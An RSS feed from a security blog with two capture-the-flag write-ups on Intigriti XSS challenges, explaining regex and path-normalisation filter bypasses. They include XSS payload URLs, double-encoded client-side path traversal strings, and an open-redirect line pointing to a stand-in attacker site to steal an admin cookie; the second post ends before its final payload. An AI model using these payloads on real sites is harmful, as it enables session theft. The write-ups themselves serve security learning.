<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Posts on Alfin&#39;s Notes</title>
    <link>http://example.org/posts/</link>
    <description>Recent content in Posts on Alfin&#39;s Notes</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Some copyright notice - [my license](https://example.com/license)</copyright>
    <lastBuildDate>Sun, 19 Jan 2025 21:26:29 +0530</lastBuildDate><atom:link href="http://example.org/posts/index.xml" rel="self" type="application/rss+xml" /><icon>http://example.org/logo2.png</icon>
    
    
    <item>
      <title>Intigriti 0125 XSS Challenge</title>
      <link>http://example.org/posts/intigriti-0125/</link>
      <pubDate>Sun, 19 Jan 2025 21:26:29 +0530</pubDate>
      
      <guid>http://example.org/posts/intigriti-0125/</guid>
      <description><![CDATA[<p><strong>tl;dr</strong></p>
<ul>
<li>Abusing URL parsing implemented using Regex .</li>
<li>Bypassing filters to using Path Normalization .</li>
<li>Finally XSS !!.</li>
</ul>
<p>Intigriti dropped another Interesting XSS challenge,This time created by <a href="https://x.com/0xGodson_">0xGodson_</a> .</p>
<h2 id="-challenge-overview">ðŸ”Ž Challenge Overview</h2>
<p>The challenge is straightforward: it provides an input text box where we can enter our input, and it displays the output accordingly.</p>
<p>There is no server-side component to this challenge, all functionality is handled entirely on the client-side JavaScript my favorite kind of challenge!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> XSS() {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">decodeURIComponent</span>(<span style="color:#8be9fd;font-style:italic">window</span>.location.search).includes(<span style="color:#f1fa8c">&#39;&lt;&#39;</span>) <span style="color:#ff79c6">||</span> <span style="color:#8be9fd;font-style:italic">decodeURIComponent</span>(<span style="color:#8be9fd;font-style:italic">window</span>.location.search).includes(<span style="color:#f1fa8c">&#39;&gt;&#39;</span>) <span style="color:#ff79c6">||</span> <span style="color:#8be9fd;font-style:italic">decodeURIComponent</span>(<span style="color:#8be9fd;font-style:italic">window</span>.location.hash).includes(<span style="color:#f1fa8c">&#39;&lt;&#39;</span>) <span style="color:#ff79c6">||</span> <span style="color:#8be9fd;font-style:italic">decodeURIComponent</span>(<span style="color:#8be9fd;font-style:italic">window</span>.location.hash).includes(<span style="color:#f1fa8c">&#39;&gt;&#39;</span>)
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">function</span> getParameterByName(name) {
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">var</span> url <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">window</span>.location.href;
</span></span><span style="display:flex;"><span>            name <span style="color:#ff79c6">=</span> name.replace(<span style="color:#f1fa8c">/[\[\]]/g</span>, <span style="color:#f1fa8c">&#34;\\$&amp;&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">var</span> regex <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">RegExp</span>(<span style="color:#f1fa8c">&#34;[?&amp;]&#34;</span> <span style="color:#ff79c6">+</span> name <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;(=([^&amp;#]*)|&amp;|#|$)&#34;</span>);
</span></span><span style="display:flex;"><span>            results <span style="color:#ff79c6">=</span> regex.exec(url);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>results) <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>results[<span style="color:#bd93f9">2</span>]) <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">decodeURIComponent</span>(results[<span style="color:#bd93f9">2</span>].replace(<span style="color:#f1fa8c">/\+/g</span>, <span style="color:#f1fa8c">&#34; &#34;</span>));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Function to redirect on form submit
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">function</span> redirectToText(event) {
</span></span><span style="display:flex;"><span>            event.preventDefault();
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> inputBox <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#39;inputBox&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> text <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">encodeURIComponent</span>(inputBox.value);
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">window</span>.location.href <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`/challenge?text=</span><span style="color:#f1fa8c">${</span>text<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Function to display modal if &#39;text&#39; query param exists
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">function</span> checkQueryParam() {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> text <span style="color:#ff79c6">=</span> getParameterByName(<span style="color:#f1fa8c">&#39;text&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> (text <span style="color:#ff79c6">&amp;&amp;</span> XSS() <span style="color:#ff79c6">===</span> <span style="color:#ff79c6">false</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">const</span> modal <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#39;modal&#39;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">const</span> modalText <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#39;modalText&#39;</span>);
</span></span><span style="display:flex;"><span>                modalText.innerHTML <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`Welcome, </span><span style="color:#f1fa8c">${</span>text<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">!`</span>;
</span></span><span style="display:flex;"><span>                textForm.remove()
</span></span><span style="display:flex;"><span>                modal.style.display <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;flex&#39;</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>     <span style="color:#8be9fd;font-style:italic">window</span>.onload <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span> () {
</span></span><span style="display:flex;"><span>                generateFallingParticles();
</span></span><span style="display:flex;"><span>                checkQueryParam();
</span></span><span style="display:flex;"><span>            };
</span></span></code></pre></div><p>Examining the code, we can see that our input is stored in the <strong>text</strong> variable and eventually ends up in the <strong>innerHTML</strong> sink, suggesting an easy XSS. However, we need to make the <strong>XSS()</strong> function return <strong>true</strong>.</p>
<p>The <strong>XSS()</strong> function checks for <strong>&lt;</strong> and <strong>&gt;</strong> characters in the <strong>window.location.search</strong> and <strong>window.location.hash</strong> parts of the URL. This means that if we input <strong>?text=&lt;img src=x onerror=alert()&gt;</strong>, it will be blocked because <strong>window.location.search</strong> contains <strong>&lt;</strong> and <strong>&gt;</strong>.</p>
<p><img src="https://hackmd.io/_uploads/B1kLj9qwkx.png" alt="image"></p>
<h2 id="-attack-plan">ðŸ¥· Attack plan</h2>
<p>Looking at how the <strong>text</strong> parameter is being parsed in the <strong>getParameterByName()</strong> function, we can see that it is being parsed using a Regex that checks for a match in the entire URL.</p>
<p>As you can see, the <strong>XSS()</strong> check for starting <strong>&lt;</strong> and closing <strong>&gt;</strong> occurs on <strong>window.location.search</strong> and <strong>window.location.hash</strong>, but the URL parameter <strong>text</strong> is being parsed using Regex from <strong>window.location.href</strong>, which contains the entire URL.</p>
<p>So if we manage to sneak in our payload somewhere other than the search part or the hash part of the URL, it will be parsed by the Regex and will end up in the innerHTML sink.</p>
<p>What if we give it in the path part of the URL?!</p>
<p>Like this:  <code>https://challenge-0125.intigriti.io/&amp;text=&lt;payload&gt;/../challenge</code></p>
<p>Here, the Regex will parse it, and the search part and hash part of the URL are empty and don&rsquo;t contain starting <strong>&lt;</strong> and closing <strong>&gt;</strong>, so the payload will reach the innerHTML sink and pop <code>alert()</code>.</p>
<p>Make sure to URL encode the <strong>/</strong> !!</p>
<h2 id="--final-payloads">ðŸš€  Final Payloads</h2>
<p><strong><a href="https://challenge-0125.intigriti.io/&amp;text=%3Cimg%20src=x%20onerror=alert()%3E%2f../challenge">https://challenge-0125.intigriti.io/&amp;text=%3Cimg%20src=x%20onerror=alert()%3E%2f../challenge</a></strong></p>
<h2 id="-exploit-">ðŸ’€ Exploit !!</h2>
<p><img src="https://hackmd.io/_uploads/By0cyicvyl.png" alt="image"></p>]]></description>
      
    </item>
    
    
    
    <item>
      <title>Intigriti 0824 XSS Challenge</title>
      <link>http://example.org/posts/intigriti-0824/</link>
      <pubDate>Sun, 05 Jan 2025 10:17:19 +0530</pubDate>
      
      <guid>http://example.org/posts/intigriti-0824/</guid>
      <description><![CDATA[<p><strong>tl;dr</strong></p>
<ul>
<li>Bypassing CSPT filters and UUID validations implemented using Regex .</li>
<li>Chaining CSPT and Open-Redirect to achieve XSS .</li>
<li>Finally XSS and retrive the admin cookie .</li>
</ul>
<p>Intigriti dropped another awesome XSS challenge,This time created by <a href="https://x.com/_CryptoCat">@_CryptoCat</a>. The challenge felt fairly straightforward,  definitely less headbanging than usual, I managed to solve it in around 20 minutes after diving in.</p>
<h2 id="-challenge-overview">ðŸ”Ž Challenge Overview</h2>
<p>The challenge revolved around a classic note-taking application, featuring standard functionalities like creating , viewing notes and also it included an option to report the note, which would trigger an admin bot to visit and review it.</p>
<p><img src="https://hackmd.io/_uploads/HyPmr2DqA.png" alt="image"></p>
<p>As is typical with XSS challenges, the goal was to obtain the admin bot&rsquo;s cookie, which was the flag. For that we needed XSS.</p>
<p>Firstly taking a closer look at the 2 features, which are</p>
<ul>
<li>Create Note</li>
<li>View Note</li>
</ul>
<h2 id="1-create-note">1) Create Note</h2>
<p>The Create Note feature is straightforward. It sends a request to <code>/api/notes/fetch</code>, creating a note with a unique UUID. The note can then be viewed by navigating to <code>/view?note-uuid</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>@main.route(&#39;/api/notes/store&#39;, methods=[&#39;POST&#39;])
</span></span><span style="display:flex;"><span>@login_required
</span></span><span style="display:flex;"><span>def store():
</span></span><span style="display:flex;"><span>    data = request.get_json()
</span></span><span style="display:flex;"><span>    content = data.get(&#39;content&#39;)
</span></span><span style="display:flex;"><span>    # Server-side XSS protection
</span></span><span style="display:flex;"><span>    sanitized_content = bleach.clean(content)
</span></span><span style="display:flex;"><span>    note = Note.query.filter_by(user_id=current_user.id).first()
</span></span><span style="display:flex;"><span>    if note:
</span></span><span style="display:flex;"><span>        note.content = sanitized_content
</span></span><span style="display:flex;"><span>    else:
</span></span><span style="display:flex;"><span>        note = Note(user_id=current_user.id, content=sanitized_content)
</span></span><span style="display:flex;"><span>        db.session.add(note)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    db.session.commit()
</span></span><span style="display:flex;"><span>    return jsonify({&#39;success&#39;: &#39;Note stored&#39;, &#39;note_id&#39;: note.id})
</span></span></code></pre></div><p>The note content is sanitized server-side using the Bleach library, so this eliminates any possibility of any quick XSS.But still we had a harmless <strong>Html injection</strong>.</p>
<h2 id="2-view-note">2) View Note</h2>
<p>This appeared to be the real challenge. Upon checkin <code>view.html</code>, it becomes clear that the note-uuid is used to fetch the note contents via the fetch() method.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span> <span style="color:#8be9fd;font-style:italic">window</span>.addEventListener(<span style="color:#f1fa8c">&#34;load&#34;</span>, <span style="color:#8be9fd;font-style:italic">function</span> () {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> urlParams <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> URLSearchParams(<span style="color:#8be9fd;font-style:italic">window</span>.location.search);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> noteId <span style="color:#ff79c6">=</span> urlParams.get(<span style="color:#f1fa8c">&#34;note&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (noteId) {
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;note-id-input&#34;</span>).value <span style="color:#ff79c6">=</span> noteId;
</span></span><span style="display:flex;"><span>            validateAndFetchNote(noteId);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    });
</span></span></code></pre></div><p>Immediately, my mind turned to <strong>CSPT (Client-Side Path Traversal)</strong>, given that we had control over the fetch request.</p>
<blockquote>
<p>Client Side Path Traversal attacks arises when a web application loads some content using XHR(XmlHTTPRequests) or fetch() and the user have control over some section of the path where to load the resource.</p></blockquote>
<p>Taking a look at the <code>validateAndFetchNote()</code> function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">function</span> validateAndFetchNote(noteId) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (noteId <span style="color:#ff79c6">&amp;&amp;</span> isValidUUID(noteId.trim())) {
</span></span><span style="display:flex;"><span>            history.pushState(<span style="color:#ff79c6">null</span>, <span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#f1fa8c">&#34;?note=&#34;</span> <span style="color:#ff79c6">+</span> noteId);
</span></span><span style="display:flex;"><span>            fetchNoteById(noteId);
</span></span><span style="display:flex;"><span>        } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>            showFlashMessage(
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;Please enter a valid note ID,&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;danger&#34;</span>
</span></span><span style="display:flex;"><span>            );
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Looks like there are some checks after all .</p>
<p>It only fetched notes with valid UUIDs using the <code>isValidUUID()</code> function. Additionally, the fetchNoteByID() function had a CSPT check before making the actual fetch by using <code>noteId.includes(&quot;../&quot;)</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> fetchNoteById(noteId) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (noteId.includes(<span style="color:#f1fa8c">&#34;../&#34;</span>)) {
</span></span><span style="display:flex;"><span>            showFlashMessage(<span style="color:#f1fa8c">&#34;Input not allowed!&#34;</span>, <span style="color:#f1fa8c">&#34;danger&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        fetch(<span style="color:#f1fa8c">&#34;/api/notes/fetch/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">decodeURIComponent</span>(noteId), {
</span></span><span style="display:flex;"><span>            method<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;GET&#34;</span>,
</span></span><span style="display:flex;"><span>            headers<span style="color:#ff79c6">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;X-CSRFToken&#34;</span><span style="color:#ff79c6">:</span> csrf_token,
</span></span><span style="display:flex;"><span>            },
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>            .then((response) =&gt; response.json())
</span></span><span style="display:flex;"><span>            .then((data) =&gt; {
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (data.content) {
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;note-content&#34;</span>).innerHTML <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>                        DOMPurify.sanitize(data.content);
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(
</span></span><span style="display:flex;"><span>                        <span style="color:#f1fa8c">&#34;note-content-section&#34;</span>
</span></span><span style="display:flex;"><span>                    ).style.display <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;block&#34;</span>;
</span></span><span style="display:flex;"><span>                    showFlashMessage(<span style="color:#f1fa8c">&#34;Note loaded successfully!&#34;</span>, <span style="color:#f1fa8c">&#34;success&#34;</span>);
</span></span><span style="display:flex;"><span>                } <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (data.error) {
</span></span><span style="display:flex;"><span>                    showFlashMessage(<span style="color:#f1fa8c">&#34;Error: &#34;</span> <span style="color:#ff79c6">+</span> data.error, <span style="color:#f1fa8c">&#34;danger&#34;</span>);
</span></span><span style="display:flex;"><span>                } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>                    showFlashMessage(<span style="color:#f1fa8c">&#34;Note doesn&#39;t exist.&#34;</span>, <span style="color:#f1fa8c">&#34;info&#34;</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> (data.debug) {
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;debug-content&#34;</span>).outerHTML <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>                        data.debug;
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(
</span></span><span style="display:flex;"><span>                        <span style="color:#f1fa8c">&#34;debug-content-section&#34;</span>
</span></span><span style="display:flex;"><span>                    ).style.display <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;block&#34;</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span></code></pre></div><p>When our note is fetched, the server returns a JSON object containing the note&rsquo;s content. This content is then rendered using innerHTML, with DOMPurify applied to sanitize it, effectively preventing XSS.</p>
<p>However, if the JSON response includes a debug key, its value is rendered using <strong>outerHTML</strong> without any sanitization, which can be used to get XSS .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span> <span style="color:#ff79c6">if</span> (data.debug) {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;debug-content&#34;</span>).outerHTML <span style="color:#ff79c6">=</span> data.debug;
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;debug-content-section&#34;</span>
</span></span><span style="display:flex;"><span>        ).style.display <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;block&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="-attack-plan">ðŸ¥· Attack plan</h2>
<p>The plan is to manipulate the fetch request so that it returns a JSON object containing a <strong>debug</strong> key. However, the server only responds with a JSON object that includes a <strong>content key</strong> and the noteâ€™s content, with no way to modify this server response directly. The only method to achieve this would be to return the <strong>modified JSON from our own server</strong>.</p>
<p>However, we only have CSPT (Client-Side Path Traversal) at our disposal, which allows us to control the path of the fetch() request. This means we can only direct the fetch to different endpoints .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>fetch(<span style="color:#f1fa8c">&#34;/api/notes/fetch/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">decodeURIComponent</span>(noteId))
</span></span></code></pre></div><p>Unless there is an <strong>Open-Redirect</strong> in any of the endpoints !!</p>
<p>If we have an <strong>Open-redirect</strong>, we can use the CSPT to redirect the fetch() request to the endpoint having open-redirect, and then use the open redirect to send the request to our attacker&rsquo;s server. From there, we can respond with a JSON object that includes the debug key, containing our XSS payload.</p>
<p><img src="https://hackmd.io/_uploads/Sy56QfKcR.png" alt="finalXSS"></p>
<h2 id="open-redirect">Open Redirect</h2>
<p>There is an endpoint named <code>/contact</code> that accepts a query parameter called <strong>return</strong>. This endpoint will redirect the user to the URL specified by the value of the return parameter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>@main.route(<span style="color:#f1fa8c">&#39;/contact&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">contact</span>():
</span></span><span style="display:flex;"><span>    form <span style="color:#ff79c6">=</span> ContactForm()
</span></span><span style="display:flex;"><span>    return_url <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;return&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>method <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> form<span style="color:#ff79c6">.</span>validate_on_submit():
</span></span><span style="display:flex;"><span>            flash(<span style="color:#f1fa8c">&#39;Thank you for your message!&#39;</span>, <span style="color:#f1fa8c">&#39;success&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> return_url <span style="color:#ff79c6">and</span> is_safe_url(return_url):
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> redirect(return_url)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> redirect(url_for(<span style="color:#f1fa8c">&#39;main.home&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> return_url <span style="color:#ff79c6">and</span> is_safe_url(return_url):
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> redirect(return_url)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;contact.html&#39;</span>, form<span style="color:#ff79c6">=</span>form, return_url<span style="color:#ff79c6">=</span>return_url)
</span></span></code></pre></div><p>So now we can redirect to the attackers site by just giving the attacker site as the return query parameter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>                  <span style="color:#ff79c6">/</span>contact?<span style="color:#ff79c6">return</span><span style="color:#ff79c6">=</span>https:<span style="color:#ff79c6">//</span>attacker<span style="color:#ff79c6">-</span>site<span style="color:#ff79c6">.</span>com
</span></span></code></pre></div><h2 id="bypassing-the-cspt-filters">Bypassing the CSPT Filters</h2>
<p>Now that we have Open-Redirect in the /contact endpoint all we have to do is path traverse to that endpoint using CSPT.However we have to bypass a few checks for that.</p>
<ul>
<li>The note uuid check -&gt; <strong>isValidUUID()</strong> function</li>
<li>Path traversal check -&gt;  <strong>noteId.includes(&quot;../&quot;)</strong></li>
</ul>
<h3 id="bypassing-isvaliduuid">Bypassing isValidUUID</h3>
<p>Looking a bit closer at the <strong>isValidUUID()</strong> function, we can see that it validates UUIDs using a regular expression.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> isValidUUID(noteId) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> uuidRegex <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> uuidRegex.test(noteId);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Here the Regex <code>[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$</code> only ensures that the UUID pattern appears at the end of the string. <strong>So there can be any prefix to this uuid , that means we can give ../../ before the uuid .</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>../82652102-973d-429d-82e0-245a4fbfd6cb 
</span></span></code></pre></div><p>To ensure that it was a proper UUID the regex should have included a <code>^</code>
in the beginnning like this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i
</span></span></code></pre></div><p>So we can do CSPT to the /contact endpoint like this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/view?note=../../../contact?return=http://attack&amp;82652102-973d-429d-82e0-245a4fbfd6cb
</span></span></code></pre></div><p>However ../ was still <strong>blocked !!!</strong></p>
<h3 id="bypassing-the-path-traversal-check">Bypassing the Path traversal check</h3>
<p>Upon looking closer, you can see that after the noteId is being checked, it is URL-decoded within the fetch function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (noteId.includes(<span style="color:#f1fa8c">&#34;../&#34;</span>)) {
</span></span><span style="display:flex;"><span>            showFlashMessage(<span style="color:#f1fa8c">&#34;Input not allowed!&#34;</span>, <span style="color:#f1fa8c">&#34;danger&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        fetch(<span style="color:#f1fa8c">&#34;/api/notes/fetch/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">decodeURIComponent</span>(noteId), {
</span></span><span style="display:flex;"><span>            method<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;GET&#34;</span>,
</span></span><span style="display:flex;"><span>            headers<span style="color:#ff79c6">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;X-CSRFToken&#34;</span><span style="color:#ff79c6">:</span> csrf_token,
</span></span><span style="display:flex;"><span>            },
</span></span><span style="display:flex;"><span>        })
</span></span></code></pre></div><p>So we can easily bypass this check by just double urlencoding the noteId.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>view=..%252F..%252F..%252Fcontact?return=http://attacker&amp;UUID
</span></span></code></pre></div><p>So during the <strong>noteId.includes(&quot;../&quot;)</strong> check, the noteId will be <strong>..%2F..%2Fcontact</strong>, so the check will return <strong>false</strong>. However, when fetch() is called, noteId gets URL-decoded with decodeURIComponent(noteId), turning it into <strong>../../../contact</strong>.</p>
<h2 id="--final-payloads">ðŸš€  Final Payloads</h2>
<p>Now that we&rsquo;ve bypassed both security checks, let&rsquo;s combine everything together.</p>
<ul>
<li><strong>Regex Bypass</strong>: By using ../../../ as a prefix to the UUID, we can bypass the regex validation.</li>
<li><strong>Path Traversal Check Bypass</strong>: Double URL encoding the payload allows us to bypass the path traversal check.</li>
</ul>
